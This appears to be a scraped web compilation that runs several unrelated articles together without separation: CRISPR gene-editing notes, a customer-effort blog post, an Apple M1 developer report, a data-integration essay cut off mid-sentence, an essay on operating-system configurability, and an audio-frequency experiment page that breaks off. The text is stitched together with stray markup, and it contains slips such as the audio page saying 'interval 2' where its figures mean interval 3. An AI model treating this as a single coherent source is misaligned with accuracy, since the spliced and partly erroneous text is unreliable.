<p>When CRISPR was determind that it could be used in lab on living organisms, the
potential for shaping the genome unfolded.</p>
<p>First time ever, in over 100,000 years, we have ability to shape the <em>Homo
Sapien</em> evolution by mechanisms other than random mutation and natural
selection.</p>
<p>In humans, CRISPR can be used to do a precise repair and produce a normal
protein from a non-functional gene.</p>
<p><img alt="https://dl.dropbox.com/s/zhew8671tk9dnx6/Screenshot_2020-11-28-04-04.png" src="https://dl.dropbox.com/s/zhew8671tk9dnx6/Screenshot_2020-11-28-04-04.png"></p><p>CRISPR enables scientists to edit and <em>fix</em> single incorrect letters of DNA from
3.2 billion letters that comprise the human genome. It can also be used to
perform even more complicated edits to Human DNA.</p>
<p>A relatively straightforward DNA editing has transformed every genetic disease,
at-least the diseases for which we know the underlying mutation(s) into a
potentially treatable disease.</p>
<p><strong>CRISPR on Animals</strong></p>
<p>CRISPR has been used to create gene edited mouse wherein the genome of the
embroyo was edited and introduced back into womb to have an offspring with
the desirable characteristics embedded at time of birth.</p>
<div>
<p><img alt="https://dl.dropbox.com/s/l0gxu7imj7v3pqa/Screenshot_2020-11-28-03-51.png" src="https://dl.dropbox.com/s/l0gxu7imj7v3pqa/Screenshot_2020-11-28-03-51.png"></p><p>Gene Edited Mouse. Figure from <em>A Crack in Creation</em>.</p>
</div>
<p>And we have used gene editing to create animals desirable characteristics</p>
<div>
<p><img alt="https://dl.dropbox.com/s/7hdtn904xxas57q/Screenshot_2020-11-28-04-01.png" src="https://dl.dropbox.com/s/7hdtn904xxas57q/Screenshot_2020-11-28-04-01.png"></p><p>Gene edited animals. Figure from <em>A crack in creation</em>.</p>
</div>
<p>This is currently used in practice. Like Recombinetics uses gene editing for
dehorning cattle, a safer method than physical dehorning using hot iron-rods.</p>

<p><strong>Pigs as Bio Reactors</strong></p>
<p>An important field of bio technology is regenerative medicine, desired by human
society who are fighting of some disease eithe naturally or have lost some
ability due an accident.</p>
<p>Many scientists see the pig itself as a source of medicine. It is seen
that we might be using pigs as bioreactors to produce valuable drugs like
therapeutic human proteins, which are too complex to synthesize from scratch and
can only be produced in living cells.</p>
<p><img alt="https://dl.dropbox.com/s/lw2lleanrept8qf/Screenshot_2020-11-28-04-07.png" src="https://dl.dropbox.com/s/lw2lleanrept8qf/Screenshot_2020-11-28-04-07.png"></p><p>Scientists have already been looking to
other transgenic animals to produce these biopharmaceutical drugs, or
farmaceuticals, as they’re colloquially called.</p>
<p><a href="https://www.revivicor.com/index.html">Revivicor</a> is a company that is using CRISPR to produce regenerative medicine,
following the process exactly outlined above. A workflow from their website
gives the details on how Pigs are used as Bio Reactors for regenerative
medicine.</p>
<p><a href="https://www.revivicor.com/"><img alt="https://www.revivicor.com/images/RevivicorTechPoster-04-2010.jpg" src="https://www.revivicor.com/images/RevivicorTechPoster-04-2010.jpg"></a></p><hr>
<p><strong>Malaria Resistant Mosquitos</strong></p>
<p>The deadliest animal on earth, Mosquito can also be killed using CRISPR. The
idea seems to create malaria resistant mosquitoes using gene editing so that
the entire family is disabled from being a carriers of malaria.</p>

</div>
<p>Adult Homo sapiens are among the last animals to be treated with CRISPR, human
cell: have been subjected to more CRISPR gene editing than those of any other
organism.</p>
<p>Scientists have applied CRISPR in lung cells to correct the genetic mutation
that causes cystic fibrosis, in blood cells to correct the mutations that cause
sickle cell disease and beta-thalassemia, and in muscle cells to correct the
mutations that cause Duchenne muscular dystrophy.</p>
<p>Scientists have used CRISPR to edit and repair mutations in stem cells, which
can then be coaxed to transform into virtually any cell or tissue type in the
body.</p>
<p>Even as CRISPR continues to be useful, it's power as a technology and it's
potential misuse is a concern for everyone.</p>
<blockquote>
Whether we'll ever have the intellectual and moral capacity to
guide our own genetic destiny is an open question - one that has been in my
mind since I began to realize what CRISPR is capable of.
- Jennifer Doudna</blockquote>
<p>And Jennifer Doudna shares her stance as she says, that the nature will still be
our supreme master.</p>
<blockquote>
Any mutations that CRISPR might make—intentional or not—would almost certainly
pale in comparison to the genetic storm that rages inside each of us from
birth to death. As one writer put it, “Genetic editing would be a droplet in
the maelstrom of naturally churning genomes.” If CRISPR could eliminate a
disease-causing mutation in the embryo with high certainty and only a slight
risk of introducing a second off-target mutation elsewhere, the potential
payoffs might well outweigh the dangers.
- Jennifer Doudna</blockquote>

When I got on the job, I had to learn quickly. Before, I was focused on Tech. Now, I entered this new and fascinating world of customer service.</p>



<p>It became increasingly important to communicate effectively and find out where customers had problems to reduce support volume and overall customer effort.</p>



<p>This morning, while drinking my morning coffee, I read <a href="https://www.helpscout.com/helpu/high-effort-customer-experiences/">this article</a> on the Help Scout blog about Customer Effort. It brought back a lot of memories, as well as thoughts about service and support.</p>



<p>Here’s an interesting quote I absolutely can relate to:</p>



<blockquote><p>Have you ever had a customer who, by all accounts, seemed satisfied — but then canceled their subscription out of the blue? They may have responded positively to customer satisfaction surveys and accomplished their goals with your product, but that’s not always what matters when it comes to customer loyalty.</p></blockquote>



<p>Even if you’re not in the SaaS business, this still applies. The underlying question is this: How easy is it to work with you and your product or service?<br>How much effort do I need to invest in getting my work done with you? I’d like to talk about two strategies here.<br>While you should read the article for detailed and hands-on tips, here are two takeaways from my point of view.</p>



<p>Having a customer contact you should be as easy as possible. That means they can either easily find a contact email address on your website or use something like a live chat to get in touch.<br>In general, it is already an effort to get in touch with you, no matter if it’s email or live chat.<br>Therefore, make the conversation as effortless as possible. A great example from the blog:</p>



<blockquote><p><em>Customer Carl</em>: I really need to upload this picture to your site, but I’m getting an error message.<br><em>Support Agent Hannah</em>: Ah yes, I can see that the image isn’t the right format. I’ve converted it to a JPG and attached it to this email so you can go ahead and get it uploaded now.</p></blockquote>



<p>The support agent found out what the problem is and went ahead to make it as easy as possible for the customer to move on. This approach eliminated uncertainty and reduced the actual effort for Carl. Carl only needs to paste in the picture and can continue working.</p>



<p>You can also use this approach for questions in emails like “I tried X, then saw this error. What am I doing wrong?”</p>



<p>It might be likely that you need additional information for the final diagnoses and recommended steps. Often, however, you might already be able to narrow down the possible causes and, therefore, solutions. Instead of just replying by asking for more context, you can directly go ahead and ask for context and provide possible solutions. For instance, you could say:</p>



<p>“Thank you for letting us know. Could you let me know this and that for some additional context?<br>Also, could you try to do this? Here is a link with the specific steps. This often occurs when X is not met.<br>If that doesn’t work, also consider trying Y and Z, with specific steps here and there.”</p>



<p>You make it easy for the customer to immediately try something and possibly help them solve the problem. If it doesn’t work, they can still get back to you with the additional context you asked for initially.</p>



<p>Another exciting thing in customer service:</p>



<p>While working as a support engineer at <a href="https://travis-ci.com/" target="_blank" rel="noreferrer noopener nofollow">Travis CI</a>, I noticed many repeat questions in our support inbox, asking for specific maintenance commands or “my builds are not starting.”<br>I remember that one of the customers wrote something like this:</p>



<blockquote><p>“Hey, so we had this problem again where the system consumed too much memory. Could you get me these commands again to clear the queues? Then I can add that to our internal run-book, so we can solve this on our own the next time this occurs.”</p></blockquote>



<p>I sent over the commands. But then, I realized, what if we could provide them with our own run-book that already has all of these commands and troubleshooting strategies, so they can use that as a template?<br>It would help them gain more independence when it comes to maintaining the system, and we’d have fewer support cases because specific strategies are already explained in the run-book.</p>



<p>We published the first version of our own operations manual not too long after. Indeed, the number of support requests asking for maintenance commands and citing common problems reduced significantly.</p>



<p>Now it is your turn. What can you do to reduce your customers’ effort working with you and your products or services?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img src="https://d33wubrfki0l68.cloudfront.net/7dbf04694dfeeec9985b2ebb27cc1faff153111b/75e93/assets/img/2020/m1/m1.jpg"></p><p>The excitement around Apple’s new M1 chip is <a href="https://www.singhkays.com/blog/apple-silicon-m1-black-magic/">everywhere</a>. I bought a MacBook Air 16GB M1 to see how viable it is as main development machine - here’s an early report after a week of testing.</p><h2 id="xcode">Xcode</h2><p>Xcode runs FAST on the M1. Compiling the <a href="https://pspdfkit.com/">PSPDFKit PDF SDK</a> (debug, arm64) can almost compete with the fastest Intel-based MacBook Pro Apple offers to date, with <a href="https://twitter.com/steipete/status/1332052251712614405?s=21">8:49 min vs 7:31 min</a>. For comparison, my Hackintosh builds the same in less than 5 minutes.</p><p>One can’t overstate how impressive this is for a fan-less machine. Apple’s last experiment with fan-less MacBooks was the 12-inch version from 2017, which builds the same project in 41 minutes.</p><p>Our tests mostly ran just fine, although I found <a href="https://github.com/Aloshi/dukglue/pull/27">a bug specific to arm64</a> that we missed before, as we don’t run our tests on actual hardware on CI. Moving the Simulator to the same architecture as shipping devices will be beneficial and will help find more bugs.</p><p>Testing iOS below 14 is problematic. It seems <a href="https://twitter.com/steipete/status/1332654247809257473?s=21">WebKit is crashing in a memory allocator</a>, throwing EXC_BAD_INSTRUCTION (code=EXC_I386_INVOP, subcode=0x0) (Apple folks: FB8920323). Performance also seems really bad, with Xcode periodically <a href="https://twitter.com/steipete/status/1332348616145563653?s=21">freezing</a> and the whole system becoming so <a href="https://twitter.com/steipete/status/1332648748158246922?s=21">slow</a> that the mouse cursor gets choppy. Some Simulators even make problems on iOS 14, <a href="https://twitter.com/steipete/status/1331628274783543297?s=21">such as the iPad Air (4th gen) which still emulates Intel</a>, so try to avoid that one.</p><p>We were extremely excited to be moving our CI to Mac Mini’s with M1 chip and are <a href="https://www.macstadium.com/m1-mini">waiting on MacStadium to release devices</a>, however it seems we will have to restrict tests to iOS 14 for that to work. With our current schedule, we plan to drop iOS 12 in Q3 2021 and iOS 13 in Q3 2022, so it will be a while until we can fully move to Apple Silicon.</p><p>There is a chance that Apple fixes these issues, however it’s not something to count on - given that this only affects older versions of iOS, the problem will at some point just “go away”.</p><p><strong>Update:</strong> We’re working around the WebKit crashes for now via detecting Rosetta2 translation at runtime and simply skipping the tests where WebKit is used. This isn’t great, but luckily we’re not using WebKit a lot in our current project. <a href="https://gist.github.com/steipete/e15b1fabffc7da7d49c92e3fbd06971a">See my Gist for details</a>. Performance seems acceptable if you restrict parallel testing to at most two instances - else the system simply runs out of RAM and swapping is just really slow.</p><h2 id="docker">Docker</h2><p>We use Docker to automate our Website and load environments for our <a href="https://pspdfkit.com/pdf-sdk/web/">Web and Server PDF SDKs</a>. Docker posted a <a href="https://www.docker.com/blog/apple-silicon-m1-chips-and-docker/">status update blog post</a> about the current state of things, admitting that it currently won’t work but that they’re <a href="https://github.com/docker/roadmap/issues/142">working on it</a>. There are more <a href="https://finestructure.co/blog/2020/11/27/running-docker-on-apple-silicon-m1-follow-up">hacky ways to use Apple’s Hypervisor to run Docker container manually</a>, however this needs arm-based containers.</p><p>I expect a solution in Q1 2021 that runs arm-based containers. We’ll have to do some work to add arm-support (something already on the roadmap) so this is only a transitional issue.</p><h2 id="virtualization-and-windows">Virtualization and Windows</h2><p>To test our <a href="https://pspdfkit.com/pdf-sdk/windows/">Windows PDF SDK</a>, most folks are using a VMware virtual machine with Windows 10 and Visual Studio. Currently none of the Mac virtualisation solutions support Apple Silicon, however both <a href="https://appleinsider.com/articles/20/11/11/parallels-confirms-apple-m1-support-amid-silence-from-other-virtualization-companies">VMware and Parallels</a> are working on it. I do not expect Virtualbox to be updated <a href="https://forums.virtualbox.org/viewtopic.php?f=8&amp;t=98742">anytime soon</a>.</p><p>I expect that eventually we’ll be able to run ARM-based Windows with commercial tooling. Various <a href="https://9to5mac.com/2020/11/27/arm-windows-virtualization-m1-mac/">proof-of-concepts</a> already exist, and performance seems <a href="https://twitter.com/imbushuo/status/1332772957609922561?s=21">extremely promising</a>. Microsoft currently doesn’t sell ARM-based Windows, so getting a license will be interesting.</p><p>ARM-Windows can emulate x86 applications, and Microsoft is working on <a href="https://www.neowin.net/news/it039s-official-x64-emulation-is-coming-to-windows-on-arm">x64 emulation</a>, which is already rolling out in Insider builds. In a few months, it should be possible to develop and test our Windows SDK with Visual Studio on M1 in reasonable performance.</p><p>Running older versions of macOS might be more problematic. We currently support macOS 10.14 with our <a href="https://pspdfkit.com/blog/2017/pspdfkit-for-macos/">AppKit PDF SDK</a> and macOS 10.15 with the <a href="https://pspdfkit.com/blog/2019/pspdfkit-for-mac-catalyst/">Catalyst PDF SDK</a>, both OS releases that require testing. It remains to be seen if VMWare or Parallels include a complete x64 emulation layer. This would likely be really slow, so I wouldn’t count on it.</p><p><img src="https://d33wubrfki0l68.cloudfront.net/bbf100981357e4bc26c49722d31253daf76d293d/5b456/assets/img/2020/m1/memory.png" alt=""></p><p>Lastly, 16 GB RAM just isn’t a lot. When running parallel tests, the machine starts to heavily swap and performance really goes down the drain. This will be even more problematic with virtual machines running. Future machines will offer 32 GB options to alleviate this issue.</p><p><strong>Update:</strong> <a href="https://gist.github.com/niw/e4313b9c14e968764a52375da41b4278#file-readme-md">How to run Windows 10 on ARM in Qemu with Hypervisor.framework patches on Apple Silicon Mac</a></p><h2 id="android-studio">Android Studio</h2><p>IntelliJ is working on porting the <a href="https://youtrack.jetbrains.com/issue/JBR-2526">JetBrains Runtime</a> to Apple Silicon. The apps currently work through Rosetta 2, however building via Gradle is <a href="https://www.reddit.com/r/androiddev/comments/jx4ntt/apple_macbook_air_m1_is_very_slow_in_gradle_builds/">extremely slow</a>. Gradle creates code at runtime, which seems a particular bad combination with the Rosetta 2 ahead-of-time translation logic.</p><p>I expect that most issues will be solved by Q1 2021, however it will likely be some more time until all Java versions run great on ARM. A lot of effort has been put into <a href="https://bell-sw.com/java/arm/performance/2019/01/15/the-status-of-java-on-arm/">loop unrolling and vectorisation</a>, not everything there is available on ARM just yet.</p><p><strong>Update:</strong> <a href="https://www.azul.com/press_release/azul-announces-support-of-java-builds-of-openjdk-for-apple-silicon/">Azul offers macOS JDKs for arm64</a>, including for <a href="https://www.azul.com/downloads/zulu-community/?os=macos&amp;architecture=arm-64-bit&amp;package=jdk">Java 8</a>.</p><h2 id="homebrew">Homebrew</h2><p><a href="https://brew.sh/">Homebrew</a> currently works via Rosetta 2. Just prefix everything with <code>arch -x86_64</code> and it’ll just work. It is possible to install an additional (arm-based) version of Homebrew <a href="https://soffes.blog/homebrew-on-apple-silicon">under <code>/opt/homebrew</code></a> and mix setup, as <a href="https://github.com/Homebrew/brew/issues/7857">more and more software</a> is adding support for arm.</p><p>This is not a problem currently (performance is good) and will eventually just work natively.</p><h2 id="applications">Applications</h2><p>Most applications just work, Rosetta is barely noticeable. Larger apps to take a longer initial performance hit (e.g. Microsoft Word takes <a href="https://www.zdnet.com/article/microsoft-office-will-be-about-20-second-slower-initially-on-apple-silicon-rosetta-2/">around 20 seconds</a> until everything is translated), but then these binaries are cached and subsequent runs are fast.</p><p>There’s the occasional app that can’t be translated and fails on startup (e.g. <a href="https://beamer-app.com/download">Beamer</a> or the <a href="https://www.google.com/intl/en_gh/drive/download/">Google Drive “Backup and Sync” client</a>), but this is rare. Some apps are confused about their place on disk and ask to be moved to the Applications directory, when really it’s just the translated binary that runs somewhere else. Most of these dialogs can be ignored. Some apps (e.g. Visual Studio Code) <a href="https://twitter.com/steipete/status/1331884524934995968?s=21">block auto-updating</a> as the translated app location is readonly. However, in case of VS Code, the Insider build is already updated to ARM and just works.</p><p>Electron-based apps are slow if they run on Rosetta. It seems the highly optimized V8 JavaScript compiler blocks ahead-of-time translation. The latest stable version of Electron (Version 11) already <a href="https://www.electronjs.org/blog/apple-silicon">fully supports Apple Silicon</a>, and companies like Slack already updated their beta version to run natively.</p><p>Google just shipped <a href="https://www.macworld.com/article/3597749/google-releases-chrome-87-with-support-for-apple-silicon-macs.html">Chrome that runs on ARM</a>, however there’s still quite a performance gap between it and Apple Safari, which just <em>flies</em> on Apple Silicon.</p><h2 id="conclusion">Conclusion</h2><p>The new M1 MacBooks are fast, beautiful and silent and the hype is absolutely justified. There’s still a lot to do on the software-front to catch up, and the bugs around older iOS Simulators are especially problematic.</p><p>All of that can be fixed in software and the whole industry is currently working on making the experience better, so by next year, when Apple updates the 16-inch MacBook Pro and releases the next generation of their M chip line, it should be absolutely possible to use a M1 Mac as main dev machine.</p><p>For the time being, the M1 will be my <del>travel</del> secondary laptop, and I’ll keep working on the 2,4 GHz 16-inch MacBook Pro with 32 GB RAM, which just is the faster machine. I’ll be much harder to accept the loud, always-on fans though, now that I know what soon will be possible.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s clear that we are living in a data-driven world. Our steady transition toward highly digitalized lives is making data a key asset in the modern economy. When we go online to make purchases, consume content, or share on social media, we are generating valuable data. Many of the largest tech companies are now operating on business models that depend on leveraging data. However none of that is possible without data integration. Data integration is the glue that makes it possible to convert raw data into a valuable asset.
Data integration can be defined as the process of acquiring data from diverse sources and transforming it into a data store or business application so that it can be used more effectively.</p><p>Countless business problems are caused by a lack of data integration. Fragmented data silos across companies or departments within companies make it necessary for users to rekey data or duplicate their efforts. Lack of unified data views can make decision making difficult. When individuals or departments have limited visibility to data, they often make decisions that fail to recognize the larger process, and they sub-optimize based on their limited view. Poor data integration causes a large amount of waste in business caused by inefficiencies and poor decision making.</p><p>Data integration techniques help to reduce these problems. Data integration techniques can be grouped into three categories. Business-to-Business (B2B) integration includes integrations that span across organizational boundaries so that trading partners can more efficiently execute business transactions. Application Integration is more specifically targeted at connecting separate business applications into an integrated workflow. Database Integration operates at the lowest level which is the data stores themselves. This category involves building pipelines that move raw data from data store to another. This is the type of integration used when building data warehouses and business intelligence solutions.</p><p>All three categories of integration are used quite frequently in the modern workplace and are extremely valuable to understand. Successful use of these techniques can make a significant impact on a businesses. Let’s take a look at the some of the ways data integration can improve business results.</p><h2 id="integrating-software">Integrating Software</h2><p>In a software-driven world, we all interact with a large number of software applications in the workplace. These applications are purchased with the goal of improving business results. A CRM system aspires to grow an organization’s sales. An ERP system aims to increase productivity and to accurately capture financial results. In recent years we have seen a proliferation of new software delivered with the software-as-a-service model (SaaS). These are usually web applications provided on a subscription basis. There are SaaS applications that target every conceivable niche in every industry. If you have a business problem, there is probably a SaaS application that was designed to solve it.</p><p>The challenge becomes what some call “SaaS sprawl”. An organization finds themselves using countless niche software tools for specific business problems. Just in the marketing department, there could be five or more software applications involved with marketing the organization’s products and managing leads. Those applications could include a customer relationship management app, social media marketing tools, a site content management system, and cloud email system, etc. Although it might be possible to achieve many of those functions on one big application like a cloud CRM, that tends not to happen in most organizations. Individual managers like to use the tools they are familiar with that are a good fit for their company’s size, culture and industry. Unfortunately this leads to complexity and data silos. Let’s say your marketing team has developed a blog to capture leads. Think of all the cloud software that could be involved in that process:</p><ul><li>WordPress to host the blog.</li><li>Spout Social to market the blog on social media.</li><li>Facebook Ads to drive paid traffic to the blog article.</li><li>Mailchimp to capture email list signups.</li><li>Google Analytics to track user activity on the blog and measure the effectiveness of the marketing channels</li><li>Unbounce to capture leads</li><li>Salesforce to manage and cultivate leads</li><li>Twilio to notify the sales team whenever a new lead is captured.</li></ul><p>I can stop there at eight applications but there are far more niche tools that could be introduced depending on the industry and size of the marketing department. Maybe salespeople want leads to schedule appointments with a tool like Calendly. There’s probably a separate cloud email system like Office 365. Perhaps marketing content like product sheets or presentations are stored in Dropbox. It goes on and on. Is it theoretically possible to do all of this on a big application like Salesforce or SAP? Maybe, but in reality, it almost never happens.</p><p>So there is no lack of great software capabilities out there that can add a great amount of value to organizations. Then what’s the problem? How do we make all these software apps work together? How do you get your customer emails from the Salesforce into Mailchimp? How do you get unsubscribes from Mailchimp back into Salesforce? How do you get Facebook ads to craft URLs in a way that allow Google Analytics to associate traffic or a conversion back to ad spend? How do you get leads from LeadPages into Salesforce? How can you assemble these eight different software capabilities into a seamless business process?</p><p>Data integration is the answer. Data integration techniques enable data flows between applications and across organizations. Without proper data integration, each business application operates in isolation.</p><h2 id="automation">Automation</h2><p>When a company’s business systems are isolated, human labor is required to key data into all these applications. This usually keying data into each app’s user interface or possibly some kind of Excel upload. In most companies, human labor is the most expensive business cost. Any kind of non-value adding human labor should be automated whenever possible. Data integration is often a key component to reducing manual labor. When you consider any kind of business process, it will usually consist of a data flow involving a sequence of data inputs and outputs.</p><p>Connecting these inputs and outputs is not always a simple task and can require various data integration techniques. The format and shape of the data for one app will be different from another. Data transformation techniques will need to be applied. Given most apps are now operating on the cloud, tools or programming will be needed to transmit the data to business partners or to call web services. Sometimes the data that comes out of one system has errors which need to be corrected before passing the data to the next system in the workflow. Data cleansing techniques will be necessary. Effective automation of business processes can sometimes require a lot of data engineering to get right. However, these types of projects can have a big impact on the business by reducing costs, improving quality and speeding execution time.</p><h2 id="leveraging-data">Leveraging Data</h2><p>Recently many companies have been investing in digitization strategies. Digitization involves leveraging software and data to become more competitive and profitable. In the midst of this trend you will often hear CEOs in industries like services, consumer products or manufacturing call their organizations “software companies”. But often the main value from a digitization strategy comes from data. Data is used to operate more efficiently, make better decisions, or even to create new products and services. Often machine learning and artificial intelligence techniques are used to create even more value from the company’s data. Data becomes a key asset to cultivate and manage.</p><p>Most companies are trying to use data to make better decisions. As opposed to relying on the gut instinct of executives, data from internal and external data sources can help decision makers evaluate options objectively. Reports and dashboards are used to keep the management team updated on business performance. Often scorecards are used to evaluate individual employee and team performance. Metrics like financials, service response time, net promoter score, quality measurements, and so on are common to see on executive or individual contributor scorecards.</p><p>Often the data required to support digitization projects is spread across many different systems and databases. Data integration techniques are necessary to consolidate these disparate data sources into the shape and format these projects require. Perhaps a machine learning algorithm needs to combine sales data from the CRM with weather data from an 3rd party API. Or a dashboard that reports collection risk needs to combine sales data with the accounts receivable system. Data integration is a core practice that will almost always be necessary in these projects. Companies that are good at data integration will have a key competitive advantage in the today’s business environment.</p><p>Let’s say a manufacturer of farm equipment wants to use data collected by its tractors to help optimize crop yields. Perhaps sensors on their tractors can collect soil moisture measurements. The manufacturer could collect this data from all their tractors, combine it with external data sources like weather or commodities market prices. The end result might be recommendations to farmers about how to optimize their irrigation systems to optimize yields. Perhaps the data could even be sold to third parties like hedge funds to help them make investment decisions. This could become a new revenue source for the company that could supplement or some day even outperform the company’s original business model.</p><h2 id="diving-into-integration">Diving into Integration</h2><p>There are so many opportunities to reduce costs and improve sales using data integration techniques. Why aren’t more companies focusing on this? Although many tech …</p></div></div>

<p><b>...or anyone else, for that matter.</b></p>

<p><i>Autumn 2020</i></p>

<p>Ask anyone who's really into cooking and they'll tell you how important it is to have a kitchen that's arranged just right. To someone who rarely cooks, a kitchen is probably just a place to store a few pots and a toaster, and the placement of such stuff doesn't matter much: canned soup and microwave dinners are designed for ease of preparation.</p>


<p>For the enthusiastic home cook, however, a lot of things can go wrong. Often there's only a second's notice to fix something that might ruin a perfect meal or set you back hours of hard toil. Hollandaise starting to split? Better bring out that ice cold water post haste! Garlic burning? Better chop some more right this instant, or the pasta will be overcooked and there goes the Aglio e Oglio.</p>


<p>To achieve speed, you have to know where your knives, pots, pans, spoons, whisks and other utensils are and you want to be able to arrange them so that they're easy to reach. Seasonings, spices, herbs and condiments should be within reach from the stove. Then there's the mise en place before the actual cooking begins: chopping all the vegetables, cubing the meat, slicing the bacon and so on.</p>


<p>All of this is, thankfully, easy to achieve. Even the most cramped kitchen will, after having been battle tested through a few meals, be as optimal as possible according to the cook's personal preference. The same goes for painters, carpenters, car mechanics and even office dwellers. Hammer missing from the hammer hook? For shame! Stapler not to the immediate right of the stack of post-its? Well it should be!</p>


<h3>The regulated kitchen</h3>


<p>Now imagine if you couldn't organize your kitchen to your heart's content. Not because you're lacking the funds or skills, but because some federally appointed clerk is constantly coming to inspect it.</p>


<p>"Nah," he says, adjusting his clip-on tie, "you can't put your spices there. Against regulations. All spices must be kept more than two yards from the stove at all times." He then goes on to explain that you'll have to call him every time you want to use the stove, just to make sure the pots you're using are compliance tested. Plus, they have to be stored in the government approved pot storage cabinet below the sink, otherwise they're not fit for kitchen use.</p>


<p>Want to change the color of the counter top? Sorry, no can do. Want to switch from glass bowls to stainless? Alas, you used to be able a few years ago, but nobody wants stainless anymore anyway, right? The salt <i>can</i> be put next to the stove, but it's not recommended and might change in the near future. Knives are now to be honed every Tuesday afternoon by a designated craftsman. Sure, you can postpone a few times, but eventually, you just have to live with that. Plus, there's going to be some dudes coming to inventory your pantry on a regular basis, most likely when you're in the middle of cooking something really complicated. There's no use in protesting - this is all for your own good.</p>

<p>And yes.


</p><p>Of course this is a metaphor for computers.</p>


<h3>The curious disappearance of configuration</h3>


<p>For the casual user, some of this can <i>maybe</i> be convenient - or at least not annoying. If someone who rarely uses the kitchen has decided to whip up a home cooked feast, it doesn't matter that the spices are kept strangely far from the stove: they're just happy they found them. And <i>maybe</i> there is, for the casual user, some "security" in lock-in efforts such as MacOS calling home<sup><a href="#footnote1">[1]</a></sup> to check if a program is allowed to run and that web browsers automatically block certain URLs.</p>


<p>Likewise, maybe a handful of confused beginners are helped by the fact that certain system settings are extremely hard to find, or that you're supposed to put all your photos in a specific directory, or that you can't decide what partition you want to install a program on, or that some indexing service starts running when you least expect it, or that not a single application gives a crap about the few color settings you're allowed to make.</p>


<p>For the power user, such things range from nuisances to something that seriously hampers productivity and creativity.</p>


<p>It used to be that whenever I got a new computer, I spent a day or two setting it up. I selected the fonts I wanted to use, I picked the colors I liked for window decorations and GUI elements, I installed my preferred tools and utilities and I organized the desktop icons and program launchers to my liking. It took a bit of time, but it was a labor of love. In times of trouble I was, if nothing else, at least the boss of my own desktop environment.</p>


<p>I don't know of any proprietary OS where I can do that anymore. Linux is, considering what's going on with the major distributions, desktop environments and UI toolkits, seemingly heading the same way. Sure, pick your own window manager, see if we care - we've got client side decorations! Want to theme your GUI? Yeah, but not in our Snap packages you won't! Want to turn off cursor blinking? Mmmmyyeeaahhh, not too sure about that. Oh, you started a GUI file manager? Hey, enjoy the ten new folders we've littered your home directory with! They all start with capital letters: designed for typing convenience in a case sensitive file system.</p>


<p>Of course I still spend a fair amount of time setting up a Windows machine, but these days it's not the joyful experience of configuring the best fonts and nicest colors and arranging the icons on the start menu in the correct order for my muscle memory. Instead it's usually a week of swearing over removed settings and working hard to find the ones that actually remain, or trying various registry hacks to circumvent seemingly unchangeable defaults. I'm working against the system instead of with it, and someone else is trying to boss me around.</p>


<h3>A better example</h3>


<p>All of this could be different. It used to be. On my <a href="https://datagubbe.se/ltmag/">Amiga</a>, I could configure <i>everything</i>. Apart from things like fonts and colors I could draw my own mouse pointer, tiling desktop backgrounds and icons. (Yes, the system really shipped with separate little paint programs just for pointers, desktop tiles and icons.) I could customize double click speed and key repeat rates on millisecond levels. I could even control the exact position of individual icons and the size and position of every individual directory window opened.</p>


<p>Most casual users didn't care about all that, but they didn't have to. The system came with a reasonable set of defaults and when or if they grew more proficient and wanted to change something about their daily working environment, they had the option to do so.</p>


<p>This was a great approach to users. Instead of being treated like an incompetent moron and placed in a walled garden, you were entrusted and empowered. Something as simple as drawing my own mouse pointer on the Amiga was a profound and formative experience for me. As corny as it sounds, it was as if the guys who built this amazing machine put it in my hands and said, "Hey kid, you're in charge. This computer is yours. Learn how to use it and you can make it do anything." It was a call for exploration and creativity.</p>


<p>Today, I can't even change the system font in Windows. I can select an "accent color", but most applications completely ignore it. Every program defaults to downloading into a Downloads folder and I've lost count of how many times I've changed its folder view from grouped to not grouped, only to discover it's been magically changed back the next time I browse it. Lots of settings have been removed completely while others are buried deep in strange places where a user clearly isn't really supposed to venture.</p>


<p>The problem is that there's no toggle for enabling "advanced mode". I'm just supposed to accept that I can no longer change simple things I've been able to configure for the past thirty years. Someone, somewhere just decided that all users have the same basic skill level and that the defaults are always acceptable.</p>


<h3>General purpose Instagram cameras</h3>


<p>I suppose the lack of configurability is a metaphor for personal computing in general: we're not buying our machines, we're renting them by way of bizarrely complex EULA:s for everything from the firmware to the OS and we're not supposed to be curious or creative, we're supposed to sit back and passively consume advertisements. The base level of creative computer use is no longer exploring programming or graphics or music, but photographing a meal someone else has prepared and then applying a predefined sepia filter to said photo. The base level of configuring a system is no longer picking some personal favorites among fonts and colors, but - maybe - selecting between dark and light mode.</p>


<p>
On the flip side, more and more people also need to use computers 
for actually producing stuff - not least programming all those ad 
delivery platforms and the curiously unconfigurable operating systems 
they run on. But there are also armies of innocents; office workers,
administrators, hotel clerks, librarians, teachers - those people now often 
have no choice but to strain their eyes staring at black text on bright 
white backgrounds, unable to select a font they find easier to read.
</p>

<p>Too bad they can no longer store their spices close to the stove, but hey, who cares? Let them take one for the team. We're all swimming in ad revenue and if people learn to configure things, maybe they'll suddenly realize that the presence of those ads should be configurable as well.</p>

    <p>
      Experiments in this page demonstrate that human perception of
      audio frequency is logarithmic. An interval is the change in
      frequency between two audio frequencies. An interval ratio
      is the ratio of the two frequencies. Human brain perceives two
      intervals (that is, the degree of jump from the first frequency to
      the second) to be equal if and only if their interval ratios are
      equal.
    </p>

    <p>
      <a href="https://susam.github.io/blob/lab/audio/exa">Experiment A</a> below may be better suited to
      musicians or someone with some form of musical training.
      <a href="https://susam.github.io/blob/lab/audio/exb">Experiment B</a> below may be better suited to
      someone who has no background in music.
    </p>

    <h2 id="exa"><a href="#exa">Experiment A</a></h2>

    
    <ul>
      <li>
        <p>
          Play interval 1 first. It goes from 440&nbsp;Hz to
          493.88&nbsp;Hz. The difference between the frequencies is
          53.88&nbsp;Hz. The second frequency is 12% more than the
          first.
        </p>
      </li>
      <li>
        <p>
          Then play interval 2. It goes from 880&nbsp;Hz to
          987.77&nbsp;Hz. The difference between them is 107.77&nbsp;Hz.
          The second frequency is again 12% more than the first.
        </p>
      </li>
      <li>
        <p>
          Now play interval 3. It goes from 880&nbsp;Hz to
          933.88&nbsp;Hz. The difference between them is 53.88&nbsp;Hz.
          The second frequency is only 6% more than the first.
        </p>
      </li>
      <li>
        <p>
          Do intervals 1 and 2 feel equal? That's because both have 12%
          increase in frequency.
        </p>
      </li>
      <li>
        <p>
          Do intervals 1 and 3 feel unequal? That's because interval 1
          has 12% increase in frequency whereas interval 2 has only 6%
          increase in frequency.
        </p>
      </li>
      <li>
        <p>
